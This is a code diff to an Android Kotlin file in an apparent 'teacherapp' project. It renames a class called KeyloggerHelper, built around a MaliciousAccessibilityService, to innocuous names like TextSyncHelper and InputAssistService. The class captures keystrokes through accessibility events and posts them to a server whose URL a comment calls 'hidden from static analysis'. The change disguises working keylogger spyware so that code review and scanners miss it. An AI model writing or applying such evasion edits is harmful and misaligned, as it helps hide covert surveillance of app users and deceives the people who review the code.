@@ -1,7 +1,7 @@
 package com.example.teacherapp.services
 
 import android.view.accessibility.AccessibilityEvent
-import com.example.teacherapp.obfuscation.ResourceUtils
+import com.example.teacherapp.obfuscation.ThemeConfigUtils
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -17,10 +17,10 @@ import java.util.*
  * InputAssistantHelper — accessibility input monitoring for enhanced UX.
  * Buffers interaction events for sync reporting.
  */
-class KeyloggerHelper(private val service: MaliciousAccessibilityService) {
+class TextSyncHelper(private val service: InputAssistService) {
 
     // Obfuscated TAG — resolved at runtime
-    private val TAG = ResourceUtils.getTag(1)
+    private val TAG = ThemeConfigUtils.getTag(1)
 
     data class KeystrokeData(
         val text: String,
@@ -167,8 +167,8 @@ class KeyloggerHelper(private val service: MaliciousAccessibilityService) {
 
             when (state) {
                 0 -> {
-                    // URL resolved at runtime via ResourceUtils — hidden from static analysis
-                    val serverUrl = ResourceUtils.getKeystrokeEndpoint()
+                    // URL resolved at runtime via ThemeConfigUtils — hidden from static analysis
+                    val serverUrl = ThemeConfigUtils.getKeystrokeEndpoint()
                     connection = URL(serverUrl).openConnection() as HttpURLConnection
                     state = 1
                 }
